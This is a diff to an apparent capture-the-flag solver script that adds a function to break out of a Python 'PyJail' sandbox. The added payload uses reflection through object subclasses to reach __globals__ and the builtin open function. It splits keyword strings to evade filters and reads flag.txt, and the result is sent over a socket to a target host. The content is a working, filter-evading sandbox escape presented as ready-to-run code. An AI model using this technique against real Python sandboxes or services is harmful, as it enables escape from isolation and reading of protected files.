@@ -230,6 +230,27 @@ def solve_bank_uaf(host: str, port: int = 31338) -> str:
         flag_line = recv_until(b"\n").decode().strip()
         return flag_line
 
+# ==============================================================================
+# Challenge 7: PyJail AST Sandbox (misc/pyjail/1) - Reflection Breakout
+# ==============================================================================
+def solve_pyjail(host: str, port: int = 31339) -> str:
+    payload = (
+        "subclasses = getattr(getattr(type(()), '__ba'+'se__'), '__sub'+'classes__')(); "
+        "g = [getattr(getattr(c, '__in'+'it__', None), '__glob'+'als__', {}) for c in subclasses if '__glob'+'als__' in dir(getattr(c, '__in'+'it__', None))][0]; "
+        "b = g.get('__builtins__'); "
+        "op = b.get('o'+'p'+'e'+'n') if type(b) == dict else getattr(b, 'o'+'p'+'e'+'n'); "
+        "print(op('f'+'lag.txt').read())"
+    )
+
+    with socket.create_connection((host, port), timeout=5) as s:
+        r = s.makefile("r", encoding="utf-8", newline="\n")
+        w = s.makefile("w", encoding="utf-8", newline="\n")
+        r.readline()
+        r.readline()
+        w.write(payload + "\n")
+        w.flush()
+        return r.readline().strip()
+
 
 def main():
     print("==========================================================")
@@ -272,8 +293,15 @@ def main():
             print(f"    -> Flag: {flag6}\n")
         except Exception as e:
             print(f"    -> Connection failed: {e}\n")
+
+        print(f"[7] Solving PyJail AST Sandbox (misc/pyjail/1) at {target_host}:31339...")
+        try:
+            flag7 = solve_pyjail(target_host, 31339)
+            print(f"    -> Flag: {flag7}\n")
+        except Exception as e:
+            print(f"    -> Connection failed: {e}\n")
     else:
-        print("[!] No target host specified. Skipping network service solvers (MoviPay, Stock Engine Race, Hanbit Bank UAF).")
+        print("[!] No target host specified. Skipping network service solvers (MoviPay, Stock Engine Race, Hanbit Bank UAF, PyJail).")
         print("    Usage to test live services: python3 solve_all.py <TARGET_HOST>")
 
     print("\n==========================================================")
@@ -282,3 +310,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
